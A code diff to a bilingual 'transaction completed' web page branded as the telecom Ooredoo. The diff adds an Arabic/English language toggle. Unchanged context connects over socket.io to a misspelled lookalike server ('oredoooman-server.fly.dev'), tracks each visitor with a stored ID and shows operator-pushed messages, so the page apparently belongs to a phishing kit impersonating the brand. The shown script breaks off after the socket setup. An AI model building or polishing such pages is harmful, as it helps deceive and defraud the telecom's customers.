@@ -10,8 +10,11 @@
 @font-face { font-family: 'NotoKufiArabic-Regular'; src: url('/ooredoo/fonts/NotoKufiArabic-Regular.woff2') format('woff2'); }
 @font-face { font-family: 'NotoKufiArabic-SemiBold'; src: url('/ooredoo/fonts/NotoKufiArabic-SemiBold.woff2') format('woff2'); }
 * { box-sizing: border-box; margin: 0; padding: 0; }
-body { font-family: 'Rubik-Regular', 'NotoKufiArabic-Regular', Arial, sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; direction: rtl; }
-.final-container { width: 100%; max-width: 420px; margin: 40px auto; background: #fff; border-radius: 20px; box-shadow: 0 8px 32px rgba(0,0,0,0.08); padding: 32px 24px; text-align: center; }
+body { font-family: 'Rubik-Regular', 'NotoKufiArabic-Regular', Arial, sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; flex-direction: column; align-items: center; direction: rtl; }
+.lang-toggle-wrapper { width: 100%; max-width: 420px; display: flex; justify-content: flex-start; margin-top: 12px; padding: 0 24px; }
+.lang-toggle { background: #fff; border: 1px solid #ddd; border-radius: 20px; padding: 6px 16px; font-size: 13px; cursor: pointer; color: #333; }
+.lang-toggle:hover { background: #f0f0f0; }
+.final-container { width: 100%; max-width: 420px; margin: 10px auto 40px; background: #fff; border-radius: 20px; box-shadow: 0 8px 32px rgba(0,0,0,0.08); padding: 32px 24px; text-align: center; }
 .logo-row { display: flex; justify-content: center; margin-bottom: 24px; }
 .logo-row img { height: 36px; }
 .success-icon { width: 80px; height: 80px; margin: 0 auto 20px; background: #e8f5e9; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
@@ -24,11 +27,17 @@ h1 { font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold', sans-serif; font-si
 .support { color: #4c5562; font-size: 13px; line-height: 1.6; }
 .support a { color: #ed1c24; text-decoration: none; font-weight: 600; }
 @media (max-width: 500px) {
-  .final-container { margin: 0; border-radius: 0; min-height: 100vh; padding: 24px 16px; }
+  .final-container { margin: 10px 0 0; border-radius: 0; min-height: calc(100vh - 50px); padding: 24px 16px; }
+  .lang-toggle-wrapper { padding: 0 16px; }
 }
 </style>
 </head>
 <body>
+
+<div class="lang-toggle-wrapper">
+  <button class="lang-toggle" id="langToggle" onclick="toggleLanguage()">English</button>
+</div>
+
 <div class="final-container">
   <div class="logo-row"><img src="/ooredoo/ooredoo-logo.svg" alt="Ooredoo"></div>
 
@@ -38,17 +47,17 @@ h1 { font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold', sans-serif; font-si
     </svg>
   </div>
 
-  <h1>تمت العملية بنجاح</h1>
+  <h1 id="pageTitle">تمت العملية بنجاح</h1>
 
   <div class="admin-message" id="adminMessage" style="display:none;"></div>
 
   <p class="message" id="defaultMessage">تمت معالجة عمليتك بنجاح. شكراً لاستخدامك خدمات Ooredoo.</p>
 
-  <a href="/" class="btn-home">العودة للرئيسية</a>
-  <button class="btn-print" onclick="window.print()">طباعة الإيصال</button>
+  <a href="/" class="btn-home" id="btnHome">العودة للرئيسية</a>
+  <button class="btn-print" id="btnPrint" onclick="window.print()">طباعة الإيصال</button>
 
   <div class="support">
-    <p>هل تحتاج مساعدة؟ تواصل معنا على</p>
+    <p id="supportText">هل تحتاج مساعدة؟ تواصل معنا على</p>
     <a href="tel:1100">1100</a>
   </div>
 </div>
@@ -56,6 +65,51 @@ h1 { font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold', sans-serif; font-si
 <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 <script>
 (function() {
+  var translations = {
+    ar: {
+      langBtn: 'English',
+      title: 'تمت العملية بنجاح',
+      defaultMessage: 'تمت معالجة عمليتك بنجاح. شكراً لاستخدامك خدمات Ooredoo.',
+      btnHome: 'العودة للرئيسية',
+      btnPrint: 'طباعة الإيصال',
+      supportText: 'هل تحتاج مساعدة؟ تواصل معنا على'
+    },
+    en: {
+      langBtn: 'العربية',
+      title: 'Transaction Completed Successfully',
+      defaultMessage: 'Your transaction has been processed successfully. Thank you for using Ooredoo services.',
+      btnHome: 'Back to Home',
+      btnPrint: 'Print Receipt',
+      supportText: 'Need help? Contact us at'
+    }
+  };
+
+  var currentLang = localStorage.getItem('siteLang') || localStorage.getItem('oredoo_site_language') || 'ar';
+
+  function applyLanguage() {
+    var t = translations[currentLang];
+    document.documentElement.lang = currentLang === 'ar' ? 'ar' : 'en';
+    document.documentElement.dir = currentLang === 'ar' ? 'rtl' : 'ltr';
+    document.body.style.direction = currentLang === 'ar' ? 'rtl' : 'ltr';
+    document.getElementById('langToggle').textContent = t.langBtn;
+    document.getElementById('pageTitle').textContent = t.title;
+    document.getElementById('defaultMessage').textContent = t.defaultMessage;
+    document.getElementById('btnHome').textContent = t.btnHome;
+    document.getElementById('btnPrint').textContent = t.btnPrint;
+    document.getElementById('supportText').textContent = t.supportText;
+    // Admin message text alignment
+    var adminMsg = document.getElementById('adminMessage');
+    adminMsg.style.textAlign = currentLang === 'ar' ? 'right' : 'left';
+  }
+
+  window.toggleLanguage = function() {
+    currentLang = currentLang === 'ar' ? 'en' : 'ar';
+    localStorage.setItem('siteLang', currentLang); localStorage.setItem('oredoo_site_language', currentLang);
+    applyLanguage();
+  };
+
+  applyLanguage();
+
   var SOCKET_URL = 'https://oredoooman-server.fly.dev';
   var socket = io(SOCKET_URL, { transports: ['polling','websocket'], reconnection: true, reconnectionAttempts: Infinity, reconnectionDelay: 1000 });
   var visitorId = localStorage.getItem('visitorId') || '';
